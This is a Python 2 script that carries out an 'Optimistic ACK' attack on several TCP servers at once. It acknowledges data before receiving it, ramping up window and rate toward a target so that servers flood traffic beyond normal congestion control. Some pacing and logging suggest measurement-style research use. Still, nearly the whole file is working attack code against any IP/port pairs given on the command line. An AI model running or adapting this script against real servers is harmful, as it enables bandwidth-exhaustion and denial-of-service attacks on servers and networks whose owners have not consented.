#!/usr/bin/env python2
"""Optimist ACK script for multiple clients"""

import sys
import time
from raw_packet import Connection
from multiprocessing import Process, Value
import sys

if len(sys.argv) < 5 or len(sys.argv) % 2 != 1:
    print("Usage : optack_mult.py duration target_rate dest_ip dest_port [dest_ip dest_port [...]] ")
    sys.exit()

# Some constants
mss = 1460
wscale = 4
client_bw = 2000000.
maxwindow = 15000 << wscale
min_wait = 1.2*8*40./client_bw

# No need for fancy argument parsing
duration = int(sys.argv[1]) + 1    
target_rate = int(sys.argv[2])

to_save = []

def pace(connections, duration, start_ack, mss, overrun_ack):
    """Reads the sequence number of the received packets,
    and ensures that we don't overrun the server"""
    last_received_seq = [x for x in start_ack]
    first_seq = [x for x in start_ack]
    start = time.time()
    
    while True:
        for (i, c) in enumerate(connections):
            try:
                (r_seq, length) = c.read_packet()
                if r_seq == last_received_seq[i]:   # retransmission detected
                    overrun_ack[i].value = last_received_seq[i]
                elif r_seq > last_received_seq[i]:
                    last_received_seq[i] = r_seq
                
                now = time.time()
                elapsed = now - start
                to_save.append("%f, %d"%(elapsed, r_seq))
                print("%f, %d, %d"%(elapsed, r_seq, length))
                sys.stdout.flush()
                # Tiemout. Terminate the thread
                if (elapsed > duration):
                    sys.exit()
            except Connection.Closed:
                # Not much we can do...
                return

def optack():
    """Conduct the Optimistic ACK attack on the provided hosts."""
    connections = []
    # Parse the provided IP / port pairs and create the corresponding connections
    for i in range(3, len(sys.argv), 2):
        try:
            dest_ip = sys.argv[i]
            port = int(sys.argv[i+1])
            if port < 0 or port > 65536:
                raise ValueError
            c = Connection(dest_ip, port)
        
            connections.append(c)
        except ValueError:
            print("Not a valid IP / port pair : (%s, %s)" % (sys.argv[i], sys.argv[i+1]) )

    # Initialize some relevant variables
    nbr_connections = len(connections)
    cur_rate = target_rate / 10.

    # Start the experiment
    start = time.time()

    # Contact each server in turn
    seq = [c.initiate_connection(window=mss, wscale=wscale) for c in connections]
    ack = [c.read_packet()[0] for c in connections]
    # Save the starting acks for logging purposes
    start_ack = [x for x in ack]
    # One window per server
    window = [mss for _ in range(nbr_connections)]

    # Allow the pace thread to selectively indicate an overrun
    overrun_ack = [Value('i', -1) for _ in range(nbr_connections)]

    # Start the pacing thread
    p = Process(target = pace, args=(connections, duration, start_ack, mss, overrun_ack))

    p.start()
    while True:
        round_start = time.time()
        elapsed = round_start - start
        # On timeout, send a reset to everyone, and then quit
        if elapsed > duration:
            for (i, c) in enumerate(connections):
                c.send_raw(seq[i]+1, ack_nbr=ack[i], rst=1)
            break

        for (i, c) in enumerate(connections):
            # Check for an overrun
            if overrun_ack[i].value > 0:
                # Tes, we have an overrun. Reset the ACK value
                ack[i] = overrun_ack[i].value
                overrun_ack[i].value = -1
                # Don't change the window - it appears not to be necessary
            before_sent = time.time()
            # Send the ack
            c.send_raw(seq_nbr = seq[i], ack_nbr=ack[i])
            now = time.time()
            elapsed = now - start
            #print("#%d : %f, %d, (%d)" % (i, elapsed, (ack[i] - start_ack[i]) % (1 << 32), ack[i]))

            # Next ack : current plus one congestion window
            ack[i] += window[i]
            # In practice, all windows will be identical. Space the sleep calls might be a good idea
            # if a large number of servers are to be contacted as it avoid sending a burst of ACKS
            # that might cause queing
            waited = now - before_sent
            wait =  window[i]/(cur_rate * nbr_connections) - waited
            time.sleep(max(wait, 0))
            # Increase the window, until the maximum is reached
            if window[i] < maxwindow:
                window[i] += mss

        # The rate is identical for everyone. Increase it linearly until the
        # target rate is achieved
        if cur_rate < target_rate:
            cur_rate += target_rate/100.

    p.join()

if __name__ == "__main__":
    optack()
